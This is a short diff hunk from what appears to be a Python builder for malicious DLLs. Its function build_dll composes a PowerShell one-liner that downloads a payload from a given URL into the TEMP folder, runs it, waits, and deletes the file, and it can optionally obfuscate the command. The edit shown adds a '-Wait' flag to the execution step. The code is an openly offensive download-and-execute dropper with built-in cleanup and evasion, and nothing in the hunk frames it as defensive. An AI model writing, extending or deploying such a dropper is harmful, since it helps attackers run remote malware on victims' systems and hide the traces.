@@ -11,7 +11,7 @@ def build_dll(payload_url, output_name, obfuscate, version):
         # Command to download, execute, wait, and delete
         payload_name = urllib.parse.urlsplit(payload_url).path.split('/')[-1]
         temp_path = f"$env:TEMP\\{payload_name}"
-        one_liner = f"(New-Object Net.WebClient).DownloadFile('{payload_url}', '{temp_path}'); Start-Process '{temp_path}'; Start-Sleep -Seconds 4; Remove-Item '{temp_path}'"
+        one_liner = f"(New-Object Net.WebClient).DownloadFile('{payload_url}', '{temp_path}'); Start-Process '{temp_path}' -Wait; Start-Sleep -Seconds 4; Remove-Item '{temp_path}'"
 
     # Optionally obfuscate the PowerShell command
     if obfuscate:
